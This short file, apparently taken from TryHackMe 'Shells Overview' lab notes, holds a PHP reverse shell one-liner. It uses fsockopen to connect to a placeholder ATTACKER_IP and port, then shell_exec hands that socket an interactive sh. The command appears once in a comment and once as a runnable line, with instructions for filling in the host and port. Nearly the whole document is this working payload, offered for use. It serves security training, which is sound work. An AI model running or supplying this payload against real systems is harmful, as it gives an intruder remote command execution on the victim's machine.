# PHP Reverse Shell - shell_exec()
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, run with: php -r '<command>'
#
#   php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("sh <&3 >&3 2>&3");'
#
# Same as exec variant but uses shell_exec() function.

php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("sh <&3 >&3 2>&3");'
